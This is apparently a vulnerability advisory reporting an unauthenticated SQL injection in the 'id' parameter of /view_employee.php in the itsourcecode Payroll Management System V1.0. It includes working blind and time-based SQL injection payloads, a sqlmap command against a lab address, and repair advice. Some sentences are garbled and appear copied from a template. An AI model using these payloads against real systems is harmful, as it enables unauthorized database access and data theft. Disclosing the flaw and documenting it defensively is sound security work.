# itsourcecode-Payroll-Management-System-SQL-Injection2

# NAME OF AFFECTED PRODUCT(S)
- Payroll Management System

# Vendor Homepage
https://itsourcecode.com/free-projects/php-project/payroll-system-php/

# AFFECTED AND/OR FIXED VERSION(S)
- V1.0

# Vulnerable File
- /view_employee.php

# VERSION(S)
- V1.0

# Vulnerability Type
- SQL Injection

# Root Cause
- A SQL injection vulnerability was found in the "/view_employee.php" file of the "Payroll Management System Project In PHP". The reason for this issue is that attackers can inject malicious code from the parameter 'id' after no logging in with valid credentials. The application fails to properly sanitize or validate this input before using it in SQL queries. This allows attackers to manipulate SQL queries and perform unauthorized operations.

# Impact
- Attackers can exploit this SQL injection vulnerability to no unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
During the security review of "Payroll Management System", a critical SQL injection vulnerability was discovered in the "/view_employee.php" file. attackers can inject malicious SQL queries through this parameter. Immediate remedial measures are needed to ensure system security and protect data integrity.

# Vulnerability Location:
- 'id' parameter

# POC:
```
Parameter: id (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (9519=9519) THEN 1 ELSE (SELECT 9028 UNION SELECT 9123) END))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5467 FROM (SELECT(SLEEP(5)))Ykfg)
```

# NO AUTHENTICATION REQUIRED
- Exploitation requires no authentication or prior access to the system.

# The following are screenshots of some specific Managemen obtained from testing and running with the sqlmap tool:
python sqlmap.py --random-agent --batch -u "http://192.168.174.128:11001/view_employee.php?id=1" --tamper=space2comment --dbms=mysql --current-db

<img src=/img/1.png>

Suggested Repair
1. Use Prepared Statements and Parameter Binding:
   Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepared statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. Input Validation and Filtering:
   Strictly validate and filter user input data to ensure it conforms to the expected format. For example, ensure that nominee IDs match a valid numeric pattern.

3. Minimize Database User Permissions:
   Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as 'root' or 'admin') for daily operations.

4. Regular Security Audits:
   Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
